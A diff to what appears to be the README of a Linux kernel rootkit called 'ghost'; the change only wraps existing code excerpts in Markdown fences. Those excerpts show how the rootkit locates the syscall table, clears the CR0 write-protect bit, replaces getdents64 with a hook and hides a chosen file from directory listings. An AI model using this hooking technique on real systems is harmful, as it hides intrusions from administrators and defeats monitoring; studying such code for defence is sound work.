@@ -312,7 +312,7 @@ And how does it hook the syscall?
 1) Find the Syscalls Table:
 
 The find_syscall_table function uses the kprobes module to find the address of the kernel syscall table (sys_call_table).
-
+```
 unsigned long *find_syscall_table(void)
 {
     typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
@@ -325,19 +325,21 @@ unsigned long *find_syscall_table(void)
     __syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
     return __syscall_table;
 }
+```
 2) Unprotect Memory
 
 The unprotect_memory function disables write protection on the page containing the syscall table, allowing the rootkit to modify the syscall table.
-
+```
 static inline void unprotect_memory(void)
 {
     write_cr0_forced(cr0 & ~0x00010000);
 }
+```
 3) Replace the Original Function
 
 In ghost_init, the address of the original getdents64 syscall is saved and replaced with the address of the hook function (hook_getdents64).
 
-
+```
 static int __init ghost_init(void)
 {
     __syscall_table = find_syscall_table();
@@ -355,14 +357,17 @@ static int __init ghost_init(void)
     printk(KERN_INFO "Rootkit loaded: Syscall hooked\n");
     return 0;
 }
+```
 4) Protect Memory
 
 After replacement, write protection is restored.
 
+```
 static inline void protect_memory(void)
 {
     write_cr0_forced(cr0);
 }
+```
 5) Interception and Manipulation
 
 The hook function hook_getdents64 intercepts calls to getdents64, checks file names, and hides any file named file_to_hide.
